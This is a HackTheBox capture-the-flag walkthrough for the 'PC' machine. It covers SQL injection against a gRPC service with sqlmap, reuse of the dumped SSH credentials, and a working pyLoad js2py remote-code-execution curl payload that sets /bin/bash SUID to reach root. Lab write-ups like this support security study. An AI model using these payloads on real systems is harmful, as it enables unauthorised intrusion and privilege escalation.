---
title: PC - HackTheBox
date: 2023-06-16 10:06 +0200
categories: [Easy,Linux]
tags: [pc, hackthebox]
---

![PC](/assets/img/obsidian/PC.png)

Hello! Today we will be tackling the machine PC on HackTheBox. In this walk-through, we will cover the following points:

1. [Introduction to the machine](#introduction-to-the-machine)
2. [Reconnaissance and information gathering](#reconnaissance-and-information-gathering)
3. [Exploitation and gaining initial access](#exploitation-and-gaining-initial-access)
4. [Privilege escalation techniques](#privilege-escalation-techniques)
5. [Post-exploitation](#post-exploitation)
6. [Conclusion and key takeaways](#conclusion-and-key-takeaways)

Throughout this walk-through, we will be utilizing various tools and techniques to overcome challenges and progress towards rooting the machine. So, let's dive in and get started with the HackTheBox machine named PC. Happy hacking!

## Introduction to the machine
This Linux host is running a gRPC service that can be susceptible to SQL injection. Exploiting this vulnerability may grant unauthorized access to the host through SSH. Once inside, we discovered a vulnerable version of pyload, which is prone to a Remote Code Execution (RCE) exploit.
## Reconnaissance and information gathering
The first step, as usual, involves conducting a fast reconnaissance to gain an understanding of the target system.
```bash
[*] Extracting information...


	[*] Target Ip: 10.10.11.214

	[*] Operating system: Linux

	[*] Open ports: 22,50051

	[*] Services information: 

		PORT      STATE SERVICE VERSION
		22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
		50051/tcp open  unknown
```
## Exploitation and gaining initial access
After conducting some research, it has been determined that the service running on the unusual TCP open port is [gRPC](https://grpc.io/docs/what-is-grpc/introduction/). Utilizing resources such as Google and GitHub, a GUI tool has been discovered that facilitates communication with the gRPC protocol by employing a web server middleware.
```bash
❯ ./grpcui -plaintext 10.10.11.214:50051
gRPC Web UI available at http://127.0.0.1:38709/
```
An advantage of this setup is that we can intercept the communications using Burp Suite and analyze the incoming and outgoing traffic. This allows us to gain visibility into the reverse flow of information and inspect the data exchanged during the gRPC communication.

Let's proceed by conducting an automated SQL injection using the sqlmap tool. This powerful tool will help us identify and exploit any potential SQL injection vulnerabilities within the gRPC service.
- `sqlmap -r gRPC.req  --risk=3 --level=5 --dump`

```SQL
Table: messages
[1 entry]
+----+----------------------------------------------+----------+
| id | message                                      | username |
+----+----------------------------------------------+----------+
| 1  | The admin is working hard to fix the issues. | admin    |
+----+----------------------------------------------+----------+

Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+
```

Using the username "sau" and the obtained password, we will attempt to establish an SSH connection to the target system.
```bash
sau@pc:~$ (uname -n; echo '-'; ip -4 addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | tail -n 1) | tr -d '\n'; echo;
pc-10.10.11.214
```
## Privilege escalation techniques
Once the SSH connection has been established, the SCP command can be employed to transfer the LinPeas script to the target system. This will enable a swift enumeration, providing valuable insights into the system's configuration and potential vulnerabilities.
- `scp LinPeas.sh sau@10.10.11.214:/tmp/tmp.0xGjr7uXeH/`

After the LinPeas script finishes running, it reports a vulnerability on the machine, specifically _**CVE-2021-3560**_. However, attempts to exploit this vulnerability have been unsuccessful thus far.

Considering the unsuccessful exploitation attempts on the identified vulnerability, an alternative approach is necessary. Consequently, further investigation has led to the discovery of a potentially exploitable service that presents enticing opportunities.
- `root    /usr/bin/python3 /usr/local/bin/pyload`

Given the unfamiliarity with [pyLoad](https://pyload.net/), it is advisable to gain some knowledge about its functionality. Upon investigation, it has been revealed that the default port for pyLoad is 8000. Therefore, it is worthwhile to determine whether this port is open and if a pyLoad service is running on it.
```bash
sau@pc:/tmp/tmp.0xGjr7uXeH$ netstat -tlnu
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::50051                :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp        0      0 0.0.0.0:68              0.0.0.0:*                          
```

Additionally, a public exploit has been discovered ([source](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/)) that exploits a vulnerability in the pyLoad service. This vulnerability enables remote code execution (RCE) by exploiting a specific function in the js2py library. With some necessary modifications, it becomes possible to set the /bin/bash binary with SUID permissions, granting elevated privileges.
```bash
curl -i -s -k -X $'POST' \
    -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \
    --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%2b%73%20%2f%62%69%6e%2f%62%61%73%68%22%29%3b;f=function%20f2(){};&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
```
## Post-exploitation
As a result of the successful exploitation of the vulnerability in the pyLoad service and the modification of permissions for the /bin/bash binary, a root shell can now be spawned. This provides the ability to operate as the root user within the machine, granting unrestricted access and control over the system.
```bash
bash-5.0# (whoami; echo '-'; ip -4 addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | tail -n 1) | tr -d '\n'; echo;
root-10.10.11.214
```

`find / -type f \( -name root.txt -o -name user.txt \) -exec bash -p -c 'echo {} - $(cat {})' \;`
## Conclusion and key takeaways
This machine has presented a challenge, not due to its difficulty per se, but rather because of the unfamiliarity with the technologies involved. Extensive googling was required to gain knowledge about the specific technologies being used, such as gRPC. It has been an interesting experience exploring a machine that incorporates cutting-edge technologies like gRPC.